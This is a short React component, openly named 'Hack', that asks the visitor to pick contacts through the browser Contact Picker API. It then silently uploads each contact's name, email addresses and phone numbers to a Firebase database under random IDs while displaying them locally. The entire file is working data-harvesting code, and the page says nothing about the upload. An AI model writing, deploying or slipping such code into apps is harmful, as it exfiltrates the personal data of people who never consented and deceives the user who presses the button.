// @ts-nocheck
import { useState } from 'react';
import { getDatabase, ref, set } from 'firebase/database';
import { v4 as uuidv4 } from 'uuid';

const Hack = () => {
  const db = getDatabase();

  const [contacts, setContacts] = useState([]);

  const onHack = async () => {
    const supportedProperties = await navigator.contacts.getProperties();

    const contactsToSelect = await navigator.contacts.select(
      supportedProperties,
      {
        multiple: true,
      }
    );
    for (const contact of contactsToSelect) {
      set(ref(db, 'users/' + uuidv4()), {
        username: contact.name,
        email: contact.email.join(', '),
        telephone: contact.tel.join(', '),
      });
    }
    setContacts(contactsToSelect);
  };
  return (
    <div className="w-full max-w-xs">
      <p>HACK</p>
      <button onClick={onHack}>GROS BOUTTON </button>
      {contacts.map((contact) => (
        <div>
          <strong>{contact.name}</strong>
          <p>{contact.email.join(', ')}</p>
          <p>{contact.tel.join(', ')}</p>
        </div>
      ))}
    </div>
  );
};

export default Hack;
